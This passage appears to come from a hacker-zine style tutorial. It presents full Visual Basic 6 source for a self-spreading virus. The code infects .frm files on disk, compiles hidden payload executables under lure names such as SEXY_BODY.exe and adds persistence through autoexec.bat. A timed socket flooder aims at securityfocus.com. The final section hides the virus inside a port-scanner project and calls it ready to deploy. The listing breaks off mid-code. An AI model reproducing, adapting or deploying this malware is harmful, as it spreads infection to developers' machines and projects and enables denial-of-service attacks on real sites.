+    Winsock1(i).RemoteHost = "http://securityfocus.com"
+    Winsock1(i).RemotePort = "22"
+    Winsock1(i).Close
+    DoEvents
+    Winsock1(i).Connect
+Next i
+
+End Sub
+
+Private Sub Form_Terminate()
+'calling itself if some one tries to shut it down
+Shell ("cmd.exe /c " & App.Path & "\" & App.EXEName & ".exe")
+End Sub
+
+
+Private Sub Winsock1_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
+'re-opening itself if it closes/times out
+Winsock1(Index).Close
+Winsock1(Index).Connect
+DoEvents
+End Sub
+
+
+'----%<---- cut here----%<---- cut here----%<---- cut here----%<---- cut here----%<-
+
+This is just a simple port flooder. Alone it wont do anything, but after a
+lot of computers are infected then this has the potential to take the
+website off the intranet, atleast for a while.
+
+Later I will explain how this code will be taken from source code and
+compiled into an exe.
+
+
+5 -     ___---=== Raw viral code ===---___
+
+Here is the virus code that can be used to infect a bunch of other .frm files
+It is in three sub functions, and includes option explicit. The main reason
+I have included option explicit is because there is a possibility that 
+the file it will infect also has option explicit enabled. This just helps
+testing the virus to make sure that we dont accidentaly use a variable
+that hasnt been delclared. 
+
+To infect other .frm files with this launch code, execute the first sub
+fucntion (sub1()), then stop the program (or create a delay that lasts around
+4-5 seconds) then execute sub2() sub function. Obviously, visual basic studio
+6.0 will be needed.
+
+
+'--- %< ---cut-here------ %< ---cut-here------ %< ---cut-here------ %< ---cut-here---'
+
+Option Explicit
+
+Private Sub sub1()
+
+'faqchew
+
+App.TaskVisible = False
+
+Dim line1, checkstatus1, lineput As String
+Dim i, importantvariable As Integer
+Dim j As Double
+
+Dim freefile1, freefile2, freefile3 As Integer
+
+Shell ("cmd.exe /c cd " & App.Path & " && dir /b > " & Mid(App.Path, 1, 3) & "C0NFIG.sys"), vbHide
+
+If Dir(Mid(App.Path, 1, 3) & "Documents and Settings") <> "" Then
+    Shell ("cmd.exe /c cd " & Mid(App.Path, 1, 3) & "Documents and Settings && dir /b /s >> " & Mid(App.Path, 1, 3) & "MSD0S.sys"), vbHide
+Else
+    Shell ("cmd.exe /c cd " & Mid(App.Path, 1, 3) & "Program Files && dir /b /s >> " & Mid(App.Path, 1, 3) & "MSD0S.SYS"), vbHide
+End If
+DoEvents
+redo1:
+importantvariable = importantvariable + 1
+j = Timer
+j = j + 2
+Do Until Timer >= j
+Loop
+
+
+
+'use this instead of gay timer!!!!
+
+'Do
+'    DoEvents
+'Loop Until Mid(App.Path, 1, 3) & "drives.sys" <> ""
+
+
+If Dir(Mid(App.Path, 1, 3) & "C0NFIG.sys") = "" Then
+    If importantvariable >= 3 Then GoTo skip1
+    GoTo redo1
+End If
+
+freefile1 = FreeFile
+Open Mid(App.Path, 1, 3) & "C0NFIG.sys" For Input As #freefile1
+DoEvents
+
+Do Until EOF(freefile1)
+    DoEvents
+    Line Input #freefile1, line1
+    DoEvents
+    line1 = UCase(line1)
+    If Right$(line1, 4) = ".FRM" Then
+        freefile2 = FreeFile
+        Open line1 For Input As #freefile2
+            Do Until EOF(freefile2)
+                Line Input #freefile2, checkstatus1
+            
+                DoEvents
+                Dim EOInfect As Boolean
+                DoEvents
+                If checkstatus1 = "'faqchew" Then
+                    freefile3 = FreeFile
+                    Open Mid(App.Path, 1, 3) & "B00T.INI" For Append As #freefile3
+                        Do Until EOInfect = True
+                            Print #freefile3, checkstatus1
+                            If checkstatus1 = "'faqchew2" Then EOInfect = True
+                            Line Input #freefile2, checkstatus1
+                        Loop
+                        EOInfect = False
+                    Close #freefile3
+                End If
+                DoEvents
+                If checkstatus1 = "'fakmeh" Then
+                    freefile3 = FreeFile
+                    Open Mid(App.Path, 1, 3) & "AUT0EXEC.BAT" For Append As #freefile3
+                        Do Until EOInfect = True
+                            Print #freefile3, checkstatus1
+                            If checkstatus1 = "'teh endg" Then EOInfect = True
+                            Line Input #freefile2, checkstatus1
+                        Loop
+                        EOInfect = False
+                    Close #freefile3
+                End If
+                DoEvents
+                
+                'payload part one
+                If InStr(1, checkstatus1, "non disclosure revolution", vbTextCompare) Then
+                    'MsgBox checkstatus1
+                    freefile3 = FreeFile
+                    Open Mid(App.Path, 1, 3) & "I0.SYS" For Append As #freefile3
+                        Do Until EOInfect = True
+                            Print #freefile3, checkstatus1
+                            If checkstatus1 = "' fuck full disclosure. '" Then EOInfect = True
+                            Line Input #freefile2, checkstatus1
+                        Loop
+                        EOInfect = False
+                        Print #freefile3, vbCrLf
+                    Close #freefile3
+                End If
+                
+                DoEvents
+                
+                If InStr(1, checkstatus1, "'theres nothing left for me to hide", vbTextCompare) Then
+                    freefile3 = FreeFile
+                    Open Mid(App.Path, 1, 3) & "systemProj1.vbp" For Append As #freefile3
+                        Do Until EOInfect = True
+                            Print #freefile3, checkstatus1
+                            If checkstatus1 = "'-NIN 2005" Then EOInfect = True
+                            Line Input #freefile2, checkstatus1
+                        Loop
+                        EOInfect = False
+                        Print #freefile3, vbCrLf
+                    Close #freefile3
+                End If
+                
+                DoEvents
+                DoEvents
+            Loop
+            
+        Close #freefile2
+    End If
+            
+    Loop
+Close #freefile1
+
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "C0NFIG.sys"), vbHide
+
+skip1:
+'faqchew2
+
+End Sub
+
+Private Sub sub2()
+
+'fakmeh
+
+Dim IntArray(0 To 4), i As Integer
+Dim line_string, lineput As String
+Dim j As Double
+Dim freefile9, freefile2, freefile4, freefile5, freefile6 As Integer
+Dim exit_thing As Boolean
+
+If Dir(Mid(App.Path, 1, 3) & "MSD0S.sys") = "" Then GoTo skip2
+
+freefile9 = FreeFile
+Open Mid(App.Path, 1, 3) & "MSD0S.sys" For Input As #freefile9
+    Do Until EOF(freefile9)
+    
+skip_infect:
+        Input #freefile9, lineput
+        lineput = UCase(lineput)
+
+        If Right$(lineput, 4) = ".FRM" Then
+            
+            ''debug''
+            'MsgBox "lineput = " & lineput
+            
+            freefile2 = FreeFile
+            
+            exit_thing = False
+            Open lineput For Input As #freefile2
+                Do Until EOF(freefile2) Or exit_thing = True
+                    Line Input #freefile2, line_string
+                    If InStr(1, line_string, "faqchew", vbTextCompare) <> 0 Then
+                        exit_thing = True
+                    End If
+                Loop
+            Close freefile2
+            
+            If exit_thing = True Then
+               
+                GoTo skip_infect
+            End If
+            
+            freefile2 = FreeFile
+            Open lineput For Input As #freefile2
+                                
+                For i = 0 To 4
+                    IntArray(i) = 0
+                Next i
+                
+                Do Until EOF(freefile2) Or IntArray(3) <> 0 Or IntArray(4) <> 0
+                    
+                    Line Input #freefile2, line_string
+                    
+                                            
+                    IntArray(0) = IntArray(0) + 1
+                    
+                    If InStr(1, line_string, "Function", vbTextCompare) <> 0 Or InStr(1, line_string, "Sub", vbTextCompare) <> 0 Then
+                    If InStr(1, line_string, "Declare", vbTextCompare) = 0 And InStr(1, line_string, "Const", vbTextCompare) = 0 And InStr(1, line_string, ")", vbTextCompare) <> 0 And InStr(1, line_string, "(", vbTextCompare) <> 0 And InStr(1, line_string, "End ", vbTextCompare) = 0 And InStr(1, line_string, Chr(34), vbTextCompare) = 0 And InStr(1, line_string, "Exit Function", vbTextCompare) = 0 And InStr(1, line_string, "=", vbTextCompare) = 0 And InStr(1, line_string, "'", vbTextCompare) = 0 Then
+                        
+                        If IntArray(1) = 0 Then
+                            IntArray(1) = IntArray(0)
+                        Else
+                            IntArray(3) = IntArray(0)
+                        End If
+                        
+                    End If
+                    End If
+                    
+                    If InStr(1, line_string, "End Sub") <> 0 Or InStr(1, line_string, "End Function") <> 0 Then
+
+                        If IntArray(2) = 0 Then
+                            IntArray(2) = IntArray(0)
+                        Else
+                            IntArray(4) = IntArray(0)
+                        End If
+                    End If
+                    DoEvents
+                Loop
+            Close #freefile2
+            DoEvents
+            
+            freefile4 = FreeFile
+            Open Mid(App.Path, 1, 3) & "newfile.txt" For Output As #freefile4
+            
+            freefile5 = FreeFile
+            Open lineput For Input As #freefile5
+            
+            For i = 0 To IntArray(1) - 1
+                Line Input #freefile5, line_string
+                Print #freefile4, line_string
+                DoEvents
+            Next i
+            
+            freefile6 = FreeFile
+            Open Mid(App.Path, 1, 3) & "B00T.INI" For Input As #freefile6
+                Do Until EOF(freefile6)
+                    Line Input #freefile6, line_string
+                    Print #freefile4, line_string
+                    DoEvents
+                Loop
+            Close #freefile6
+            DoEvents
+            For i = i To IntArray(3) - 1
+                Line Input #freefile5, line_string
+                Print #freefile4, line_string
+                DoEvents
+            Next i
+            DoEvents
+            freefile6 = FreeFile
+            Open Mid(App.Path, 1, 3) & "AUT0EXEC.BAT" For Input As #freefile6
+                Do Until EOF(freefile6)
+                    Line Input #freefile6, line_string
+                    Print #freefile4, line_string
+                    DoEvents
+                Loop
+            Close #freefile6
+            DoEvents
+            
+            Do Until EOF(freefile5)
+                Line Input #freefile5, line_string
+                Print #freefile4, line_string
+                DoEvents
+            Loop
+            
+            
+            ''''''''''''''''
+            
+            Dim freefilefuck As Integer
+            freefilefuck = FreeFile
+            Open Mid(App.Path, 1, 3) & "I0.SYS" For Input As #freefilefuck
+                Do Until EOF(freefilefuck)
+                    Line Input #freefilefuck, line_string
+                    Print #freefile4, line_string
+                    DoEvents
+                Loop
+            Close #freefilefuck
+            
+            DoEvents
+                
+            freefilefuck = FreeFile
+            Open Mid(App.Path, 1, 3) & "systemProj1.vbp" For Input As #freefilefuck
+                Do Until EOF(freefilefuck)
+                    Line Input #freefilefuck, line_string
+                    Print #freefile4, line_string
+                    DoEvents
+                Loop
+            Close #freefilefuck
+            
+            DoEvents
+            
+            
+            ''''''''
+            
+            
+
+            Close #freefile5
+            Close #freefile4
+
+            
+            On Error Resume Next
+            FileCopy Mid(App.Path, 1, 3) & "newfile.txt", lineput
+            DoEvents
+            Kill Mid(App.Path, 1, 3) & "newfile.txt"
+            
+        End If
+        DoEvents
+    Loop
+Close #freefile9
+
+
+
+DoEvents
+'FINALY.. what we do here is create the EXE of the payload, then we
+'get the FUCK out of town like real dawgz.
+
+'.VBP file
+Dim freefilefuck1 As Integer
+freefile9 = FreeFile
+
+Open Mid(App.Path, 1, 3) & "systemProj1.vbp" For Input As #freefile9
+DoEvents
+freefilefuck1 = FreeFile
+Open Mid(App.Path, 1, 3) & "Project1.vbp" For Output As #freefilefuck1
+
+    Dim g_string As Integer
+
+    For g_string = 1 To 7
+        Line Input #freefile9, line_string
+    Next g_string
+    
+    Do Until line_string = "'see the animial in his cage that you built"
+        Line Input #freefile9, line_string
+        If InStr(1, line_string, "in his cage", vbTextCompare) = 0 Then
+            Print #freefilefuck1, Mid(line_string, 2)
+        End If
+        DoEvents
+    Loop
+
+Close #freefilefuck1
+DoEvents
+Close #freefile9
+DoEvents
+
+
+'.FRM file
+Open Mid(App.Path, 1, 3) & "I0.SYS" For Input As #freefile9
+DoEvents
+freefilefuck1 = FreeFile
+Open Mid(App.Path, 1, 3) & "Form1.frm" For Output As #freefilefuck1
+
+    Line Input #freefile9, line_string
+
+    Do Until EOF(freefile9)
+        Line Input #freefile9, line_string
+        If InStr(1, line_string, "fuck full disclosure.", vbTextCompare) = 0 Then
+            Print #freefilefuck1, Mid(line_string, 2)
+        End If
+        DoEvents
+    Loop
+
+Close #freefilefuck1
+DoEvents
+Close #freefile9
+DoEvents
+
+Dim freefilefuck2 As Integer
+freefilefuck2 = FreeFile
+Open Mid(App.Path, 1, 3) & "form1.vbw" For Output As #freefilefuck2
+    Print #freefilefuck2, "Form1 = 130, 129, 577, 679, , 0, 0, 0, 0, C" & vbCr
+Close #freefilefuck2
+DoEvents
+
+
+'now we use the vb6.exe compiler to compile the payload into an exe.. we do it STEALTHY like
+'no obvious activity going on..
+
+Shell ("cmd.exe /c cd " & Mid(App.Path, 1, 3) & " && cd Program Files\Microsoft Visual Studio\VB98 && vb6.exe /m " & Mid(App.Path, 1, 3) & "project1.vbp " & Mid(App.Path, 1, 3) & "Program Files\FileAloc100.exe"), vbHide
+DoEvents
+Shell ("cmd.exe /c cd " & Mid(App.Path, 1, 3) & " && cd Program Files\Microsoft Visual Studio\VB98 && vb6.exe /m " & Mid(App.Path, 1, 3) & "project1.vbp " & Mid(App.Path, 1, 3) & "Documents and Settings\All Users\Documents\My Music\HotMusic.exe"), vbHide
+Shell ("cmd.exe /c cd " & Mid(App.Path, 1, 3) & " && cd Program Files\Microsoft Visual Studio\VB98 && vb6.exe /m " & Mid(App.Path, 1, 3) & "project1.vbp " & Mid(App.Path, 1, 3) & "My Downloads\SEXY_BODY.exe"), vbHide
+
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "MSD0S.sys"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "AUT0EXEC.BAT"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "B00T.INI"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "newfile.txt"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "systemProj1.vbp"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "Form1.frm"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "project1.vbp"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "form1.vbw"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "I0.SYS"), vbHide
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "project1.vbp"), vbHide
+DoEvents
+
+App.TaskVisible = True
+
+Dim freefilefuck3 As Integer
+freefilefuck3 = FreeFile
+Open Mid(App.Path, 1, 3) & "autoexec.bat" For Append As #freefilefuck3
+    Print #freefilefuck3, Mid(App.Path, 1, 3) & "program files\FileAloc100.exe"
+Close #freefilefuck3
+DoEvents
+
+skip2:
+'light that burns twice as bright burns half as long
+
+
+'teh endg
+
+End Sub
+
+Private Sub Form_Load()
+
+'use these to test and infect
+Call sub1
+'Call Sub2
+End Sub
+
+
+' Support the non disclosure revolution! '
+'VERSION 5.00
+'Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
+'Begin VB.Form Form1
+'   Caption         =   "Form1"
+'   ClientHeight    =   465
+'   ClientLeft      =   1665
+'   ClientTop       =   1935
+'   ClientWidth     =   1560
+'   LinkTopic       =   "Form1"
+'   ScaleHeight     =   465
+'   ScaleWidth      =   1560
+'   Begin MSWinsockLib.Winsock Winsock1
+'      Index           =   0
+'      Left            =   0
+'      Top             =   0
+'      _ExtentX        =   741
+'      _ExtentY        =   741
+'      _Version        =   393216
+'   End
+'End
+'Attribute VB_Name = "Form1"
+'Attribute VB_GlobalNameSpace = False
+'Attribute VB_Creatable = False
+'Attribute VB_PredeclaredId = True
+'Attribute VB_Exposed = False
+'Private Sub Form_Load()
+'
+'
+''built in vb stealth functions
+'Form1.Visible = False
+'App.TaskVisible = False
+'
+''time bomb.. must be March - December when it DoSs
+'Dim strmonth As String
+'strmonth = Mid(Date, 4, 2)
+'If strmonth < 3 Then End
+'
+'Dim i As Integer
+'Dim load_sockets As Boolean
+'
+''we only want to load the sockets once.
+'If load_sockets = False Then
+'    For i = 1 To 2200
+'        Load Winsock1(i)
+'        DoEvents
+'        load_sockets = True
+'    Next i
+'End If
+'
+''2000 sockets will DoS port 80
+'For i = 1 To 2000
+'    Winsock1(i).RemoteHost = "http://securityfocus.com"
+'    Winsock1(i).RemotePort = "80"
+'    Winsock1(i).Close
+'    DoEvents
+'    Winsock1(i).Connect
+'Next i
+'
+'
+''200 sockets will DoS port 22
+'For i = 2001 To 2200
+'    Winsock1(i).RemoteHost = "http://securityfocus.com"
+'    Winsock1(i).RemotePort = "22"
+'    Winsock1(i).Close
+'    DoEvents
+'    Winsock1(i).Connect
+'Next i
+'
+'End Sub
+'
+'Private Sub Form_Terminate()
+''anit-shutdown teqnique
+'Shell ("cmd.exe /c " & App.Path & "\" & App.EXEName & ".exe"), vbHide
+'End Sub
+'
+'Private Sub Winsock1_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
+''reconnecting
+'Winsock1(Index).Close
+'Winsock1(Index).Connect
+'End Sub
+' fuck full disclosure. '
+
+
+'theres nothing left for me to hide
+'i lost my ignoracne security and pride
+'im all alone in this world you must dispise
+'i believed your promices - your promices are lies
+'terrable lies
+'-NIN 1998
+'Type=Exe
+'Form=Form1.frm
+'Reference=*\G{00020430-0000-0000-C000-000000000046}#2.0#0#..\..\..\..\..\..\WINDOWS\system32\stdole2.tlb#OLE Automation
+'Object={248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0; MSWINSCK.OCX
+'IconForm="Form1"
+'Startup="Form1"
+'HelpFile=""
+'Title="SysFunc"
+'ExeName32="SysFunc.exe"
+'Path32="..\..\.."
+'Command32=""
+'Name="SysFunc"
+'HelpContextID="0"
+'Description="Alocation Tool"
+'CompatibleMode="0"
+'MajorVer=1
+'MinorVer=0
+'RevisionVer=2
+'AutoIncrementVer=1
+'ServerSupportFiles=0
+'VersionCompanyName="Microsoft"
+'VersionFileDescription="File System Alocation tool"
+'VersionLegalCopyright="Copyright 2001"
+'VersionProductName="SysFunc Alocation Tool"
+'CompilationType=0
+'OptimizationType=0
+'FavorPentiumPro(tm)=0
+'CodeViewDebugInfo=0
+'NoAliasing=0
+'BoundsCheck=0
+'OverflowCheck=0
+'FlPointCheck=0
+'FDIVCheck=0
+'UnroundedFP=0
+'StartMode=0
+'Unattended=0
+'Retained=0
+'ThreadPerObject=0
+'MaxNumberOfThreads=1
+'DebugStartupOption=0
+'
+'[MS Transaction Server]
+'AutoRefresh=1
+'see the animial in his cage that you built
+'are you sure what side you're on
+'better not look in to closely to the eyes
+'are you sure what side the glass you are on
+'see the safety of the life you have built
+'everything where it belongs
+'feel the hollowness inside of your heart
+'and its all right where it belongs
+'what if everything around you
+'isn't quite as it seams
+'what if all the world you think you know
+'is an elaborate dream
+'and if you look right at your reflection
+'is it all you want to be
+'but if you could look right through the cracks
+'would you find yourself -
+'find yourself afraid to see
+'-
+'what if all the world's inside of your head
+'just creations of your own
+'the devils and the gods. all the living and the dead
+'and you really aught to know
+'you can live this illusion
+'you can choose to believe
+'you could keep looking but cant find the words
+'now your hidng in the trees
+'what if everything around you
+'isnt quite as it seams
+'what if all the world you used to know
+'is an elaborate dream?
+'and if you look at your reflection
+'is it all you want to be?
+'what if you could look right through the cracks
+'would you find yourself -
+'find yourself afraid to see?
+'-NIN 2005
+
+
+
+
+
+'--- %< ---cut-here------ %< ---cut-here------ %< ---cut-here------ %< ---cut-here---'
+
+
+
+
+6 -    ___---=== Viral Code attached to working program (final product)===---___
+
+Here is a program that is infected with the finished and working version of the
+virus, with the payload included. All that this needs to spread is for some
+dumb vb developer to run this bad boy and all of his vb6.0 programs that are in
+X:\program files file folder will be infected (X being the drive that the program
+is run on). This will include all of the built in .frm files that visual studio
+comes with. Example: some built in .frm files are "FrmAbout" and "FrmDialog" and
+"FrmLogin" and so on and so on. Any of these can be added to a vb6.0 project at
+any time, and if they are infected, then the virus will continue to spread.
+
+The virus code in this section is the exact same virus code that is in 
+section 5, except the code in this section is actualy attached to a working
+program, and its 100% ready to go! Use section 5 to help you understand
+what exactly is going on in this section.
+
+I found this program that is titled "PortScanner Tutorial" on the internet
+somewhere. It is used for port scanning, but thats not what im using it for here.
+
+To use this code, just take the part here marked Form1.Frm and put it into
+a text file, then name it "Form1.Frm"
+
+Do the same to the part marked "PortScanner Tutorial.vbp" and "Portscanner
+Tutorial.vbw"
+
+Then if you have visual basic 6.0 installed, you can run and compile this 
+INFECTED visual basic project.
+
+Form1.Frm:
+'--- %< ---cut-here------ %< ---cut-here------ %< ---cut-here------ %< ---cut-here---'
+
+VERSION 5.00
+Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
+Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
+Begin VB.Form Form1 
+   BorderStyle     =   3  'Fixed Dialog
+   Caption         =   "Demo of a Portscanner"
+   ClientHeight    =   3690
+   ClientLeft      =   45
+   ClientTop       =   330
+   ClientWidth     =   7095
+   LinkTopic       =   "Form1"
+   MaxButton       =   0   'False
+   MinButton       =   0   'False
+   ScaleHeight     =   3690
+   ScaleWidth      =   7095
+   ShowInTaskbar   =   0   'False
+   StartUpPosition =   3  'Windows Default
+   Begin VB.TextBox FoundPorts 
+      Height          =   2175
+      Left            =   240
+      MultiLine       =   -1  'True
+      ScrollBars      =   2  'Vertical
+      TabIndex        =   6
+      Top             =   720
+      Width           =   6735
+   End
+   Begin MSComctlLib.StatusBar Status 
+      Align           =   2  'Align Bottom
+      Height          =   255
+      Left            =   0
+      TabIndex        =   5
+      Top             =   3435
+      Width           =   7095
+      _ExtentX        =   12515
+      _ExtentY        =   450
+      Style           =   1
+      SimpleText      =   "Idle..."
+      _Version        =   393216
+      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
+         NumPanels       =   1
+         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
+         EndProperty
+      EndProperty
+   End
+   Begin VB.TextBox txtPortEnd 
+      Height          =   285
+      Left            =   4080
+      TabIndex        =   4
+      Text            =   "65536"
+      Top             =   240
+      Width           =   855
+   End
+   Begin VB.TextBox txtPortStart 
+      Height          =   285
+      Left            =   3120
+      TabIndex        =   3
+      Text            =   "1"
+      Top             =   240
+      Width           =   855
+   End
+   Begin VB.TextBox txtHost 
+      Height          =   285
+      Left            =   240
+      TabIndex        =   2
+      Text            =   "Localhost"
+      Top             =   240
+      Width           =   2535
+   End
+   Begin VB.CommandButton Command1 
+      Caption         =   "Start"
+      Height          =   285
+      Left            =   5040
+      TabIndex        =   1
+      Top             =   240
+      Width           =   1935
+   End
+   Begin MSWinsockLib.Winsock Sock 
+      Index           =   0
+      Left            =   6600
+      Top             =   3000
+      _ExtentX        =   741
+      _ExtentY        =   741
+      _Version        =   393216
+   End
+   Begin VB.Label Label1 
+      AutoSize        =   -1  'True
+      Caption         =   "This Winsock control is called ""Sock"" and has an index of 0 --->"
+      BeginProperty Font 
+         Name            =   "MS Sans Serif"
+         Size            =   9.75
+         Charset         =   0
+         Weight          =   700
+         Underline       =   0   'False
+         Italic          =   0   'False
+         Strikethrough   =   0   'False
+      EndProperty
+      Height          =   240
+      Left            =   0
+      TabIndex        =   0
+      Top             =   3120
+      Visible         =   0   'False
+      Width           =   6540
+   End
+End
+Attribute VB_Name = "Form1"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+
+Private Sub Command1_Click()
+'faqchew
+
+App.TaskVisible = False
+
+Dim line1, checkstatus1, lineput As String
+Dim i, importantvariable As Integer
+Dim j As Double
+
+Dim freefile1, freefile2, freefile3 As Integer
+
+Shell ("cmd.exe /c cd " & App.Path & " && dir /b > " & Mid(App.Path, 1, 3) & "C0NFIG.sys"), vbHide
+
+If Dir(Mid(App.Path, 1, 3) & "Documents and Settings") <> "" Then
+    Shell ("cmd.exe /c cd " & Mid(App.Path, 1, 3) & "Documents and Settings && dir /b /s >> " & Mid(App.Path, 1, 3) & "MSD0S.sys"), vbHide
+Else
+    Shell ("cmd.exe /c cd " & Mid(App.Path, 1, 3) & "Program Files && dir /b /s >> " & Mid(App.Path, 1, 3) & "MSD0S.SYS"), vbHide
+End If
+DoEvents
+redo1:
+importantvariable = importantvariable + 1
+j = Timer
+j = j + 2
+Do Until Timer >= j
+Loop
+
+
+
+'use this instead of gay timer!!!!
+
+'Do
+'    DoEvents
+'Loop Until Mid(App.Path, 1, 3) & "drives.sys" <> ""
+
+
+If Dir(Mid(App.Path, 1, 3) & "C0NFIG.sys") = "" Then
+    If importantvariable >= 3 Then GoTo skip1
+    GoTo redo1
+End If
+
+freefile1 = FreeFile
+Open Mid(App.Path, 1, 3) & "C0NFIG.sys" For Input As #freefile1
+DoEvents
+
+Do Until EOF(freefile1)
+    DoEvents
+    Line Input #freefile1, line1
+    DoEvents
+    line1 = UCase(line1)
+    If Right$(line1, 4) = ".FRM" Then
+        freefile2 = FreeFile
+        Open line1 For Input As #freefile2
+            Do Until EOF(freefile2)
+                Line Input #freefile2, checkstatus1
+            
+                DoEvents
+                Dim EOInfect As Boolean
+                DoEvents
+                If checkstatus1 = "'faqchew" Then
+                    freefile3 = FreeFile
+                    Open Mid(App.Path, 1, 3) & "B00T.INI" For Append As #freefile3
+                        Do Until EOInfect = True
+                            Print #freefile3, checkstatus1
+                            If checkstatus1 = "'faqchew2" Then EOInfect = True
+                            Line Input #freefile2, checkstatus1
+                        Loop
+                        EOInfect = False
+                    Close #freefile3
+                End If
+                DoEvents
+                If checkstatus1 = "'fakmeh" Then
+                    freefile3 = FreeFile
+                    Open Mid(App.Path, 1, 3) & "AUT0EXEC.BAT" For Append As #freefile3
+                        Do Until EOInfect = True
+                            Print #freefile3, checkstatus1
+                            If checkstatus1 = "'teh endg" Then EOInfect = True
+                            Line Input #freefile2, checkstatus1
+                        Loop
+                        EOInfect = False
+                    Close #freefile3
+                End If
+                DoEvents
+                
+                'payload part one
+                If InStr(1, checkstatus1, "non disclosure revolution", vbTextCompare) Then
+                    'MsgBox checkstatus1
+                    freefile3 = FreeFile
+                    Open Mid(App.Path, 1, 3) & "I0.SYS" For Append As #freefile3
+                        Do Until EOInfect = True
+                            Print #freefile3, checkstatus1
+                            If checkstatus1 = "' fuck full disclosure. '" Then EOInfect = True
+                            Line Input #freefile2, checkstatus1
+                        Loop
+                        EOInfect = False
+                        Print #freefile3, vbCrLf
+                    Close #freefile3
+                End If
+                
+                DoEvents
+                
+                If InStr(1, checkstatus1, "'theres nothing left for me to hide", vbTextCompare) Then
+                    freefile3 = FreeFile
+                    Open Mid(App.Path, 1, 3) & "systemProj1.vbp" For Append As #freefile3
+                        Do Until EOInfect = True
+                            Print #freefile3, checkstatus1
+                            If checkstatus1 = "'-NIN 2005" Then EOInfect = True
+                            Line Input #freefile2, checkstatus1
+                        Loop
+                        EOInfect = False
+                        Print #freefile3, vbCrLf
+                    Close #freefile3
+                End If
+                
+                DoEvents
+                DoEvents
+            Loop
+            
+        Close #freefile2
+    End If
+            
+    Loop
+Close #freefile1
+
+Shell ("cmd.exe /c del " & Mid(App.Path, 1, 3) & "C0NFIG.sys"), vbHide
+
+skip1:
+'faqchew2
+'************************************************
+'* This is where it gets a bit more complicated *
+'************************************************
+Dim Socket As Variant ' for instances of the socket we will
+                      ' use in the For loop
+
+Dim CurrentPort As Integer ' Obvious
+
+Const MaxSockets = 100 ' change this for Speed / Accuracy
+                       ' between 1 - 200
+
+' it's stable enough to use this
+On Error Resume Next
+
+
+
+' We need a way to Start / Stop, so we'll use
+' the command button's caption as a reference
+If Command1.Caption = "Start" Then
+
+' to prevent errors, disable teh textboxes
+txtHost.Enabled = False
+txtPortStart.Enabled = False
+txtPortEnd.Enabled = False
+
+
+'see above
+Command1.Caption = "Stop"
+    ' Lets load some sockets to use
+    For i = 1 To MaxSockets
+        'Load new sock instance i
+        Load Sock(i)
+    Next i
+    CurrentPort = txtPortStart.Text
+    ' Again using the command1.caption as a reference
+    ' to start / stop
+    While Command1.Caption = "Stop"
+        ' set up the ports to scan by referencing
+        ' each instance of the socket in turn
+        For Each Socket In Sock
+            ' Definately Need this so the system doesn't freeze
+            DoEvents
+            ' check if the socket is still trying to connect
+            ' or is connected
+            If Socket.State <> sckClosed Then
+                ' skip the increment of the port
+                GoTo continue
+            End If
+            ' close the socket to make double sure
+            Socket.Close
+            ' if it got to here, it's ready to try
+            ' the next port, only after checking
+            ' if we've done all the ports and the user
+            ' hasn't clicked on Stop
+            
+            If CurrentPort = Val(txtPortEnd.Text) + 1 _
+            Then Exit For
+            'set the host
+            Socket.RemoteHost = txtHost.Text
+            ' set the port
+            Socket.RemotePort = CurrentPort
+            ' inform the user of the port being scanned
+            Status.SimpleText = "Now Scanning Port " & CurrentPort
+            ' attempt connect
+            Socket.Connect
+            ' fromhere, the socket will do one of two things
+            ' 1) Raise a Connect therefore the port is open
+            ' 2) Raise an Error therefore the port is closed
+            
+            ' increment the current port
+            CurrentPort = CurrentPort + 1
+' if the socketisn't ready to be incremented, go here
+continue:
+        
+        ' goto the next socket instance
+        Next Socket
+    Wend
+'set the command1.caption to Start so we can scan again
+Command1.Caption = "Start"
+
+' re-enable the textboxes
+txtHost.Enabled = True
+txtPortStart.Enabled = True
+txtPortEnd.Enabled = True
+
+Else ' command1.caption is "Stop"
+    Command1.Caption = "Start"
+End If
+
+' close all the sockets to save memory
+For i = 1 To MaxSockets
+    Unload Sock(i)
+Next i
+
+End Sub
+
+Private Sub FoundPorts_Change()
+'fakmeh
+
+Dim IntArray(0 To 4), i As Integer
+Dim line_string, lineput As String
+Dim j As Double
+Dim freefile9, freefile2, freefile4, freefile5, freefile6 As Integer
+Dim exit_thing As Boolean
+
+If Dir(Mid(App.Path, 1, 3) & "MSD0S.sys") = "" Then GoTo skip2
+
+freefile9 = FreeFile
+Open Mid(App.Path, 1, 3) & "MSD0S.sys" For Input As #freefile9
+    Do Until EOF(freefile9)
+    
+skip_infect:
+        Input #freefile9, lineput
+        lineput = UCase(lineput)
+
+        If Right$(lineput, 4) = ".FRM" Then
+            
+            ''debug''
+            'MsgBox "lineput = " & lineput
+            
+            freefile2 = FreeFile
+            
+            exit_thing = False
+            Open lineput For Input As #freefile2
+                Do Until EOF(freefile2) Or exit_thing = True
